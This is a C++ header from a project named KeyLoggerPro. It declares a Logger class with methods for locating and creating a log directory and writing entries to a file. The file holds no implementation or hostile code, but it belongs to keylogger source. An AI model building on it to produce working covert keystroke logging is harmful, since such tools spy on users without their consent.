/**
 * Logger.h
 *
 * @author Raul Butuc
 * @version 1.0.1 - 01/08/2016
 */

#pragma once

#include "stdafx.h"
#include <fstream>

namespace KeyLoggerPro {

  class Logger {

    private:
      std::fstream log;

      LPCWSTR strToLPCWSTR(const std::string&);

    public:
      std::string getLogDir(const bool) const;
      bool chkdir(const std::string&);
      bool mkdir(std::string);

      template <class _Tp>
      std::string write(const _Tp* &);

  };

}
